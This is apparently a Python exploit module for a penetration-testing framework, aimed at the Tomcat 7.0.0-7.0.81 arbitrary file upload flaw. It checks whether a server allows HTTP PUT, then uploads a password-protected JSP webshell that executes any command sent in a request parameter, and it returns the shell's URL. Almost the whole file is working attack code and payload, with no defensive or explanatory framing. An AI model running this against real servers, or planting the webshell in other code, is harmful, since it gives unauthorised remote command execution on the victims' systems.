import re
import time
from collections import OrderedDict

from libs.pocstrike.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port
from libs.pocstrike.lib.core.interpreter_option \
    import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
from libs.pocstrike.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '1'
    version = '1'
    author = ''
    vulDate = '2021-04-12'
    createDate = '2021-04-12'
    updateDate = '2021-04-12'
    references = ['https://xxx.xx.com']
    name = 'Tomcat arbitrary file upload'
    appPowerLink = 'https://www.xxx.org/'
    appName = 'Tomcat'
    appVersion = '7.0.0-7.0.81'
    vulType = VUL_TYPE.ARBITRARY_FILE_CREATION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []
    install_requires = []
    desc = '''
        vul desc
        '''
    pocDesc = '''
            Incoming destination site
        '''

    def _options(self):
        opt = OrderedDict()
        return opt

    def _verify(self):
        return self._attack()

    def _attack(self):
        output = Output(self)
        result = {}
        body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
        res = requests.options(self.url + '/ffffzz')
        if "allow" in res.headers.keys() and res.headers['allow'].find('PUT') > 0:
            url = "/" + str(int(time.time())) + '.jsp/'
            res1 = requests.put(self.url + url, data=body)
            if res1.status_code == 201:
                result = {
                    'webshell': self.url + url[:-1] + '?pwd=023&cmd=whoami',
                    'webshell_access_tool': 'browser',
                    "remark": {}
                }
            elif res1.status_code == 204:
                output.info("{{{0}}} webshell exists".format(self.url))
            else:
                output.error("{{{0}}} server not vulnerable".format(self.url))
        else:
            output.error("{{{0}}} server not vulnerable".format(self.url))
        return self.parse_output(output, result)

    def _shell(self):
        pass

    def parse_output(self, output, result):
        if result:
            output.success(result)
        else:
            output.fail()
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


register_poc(DemoPOC)
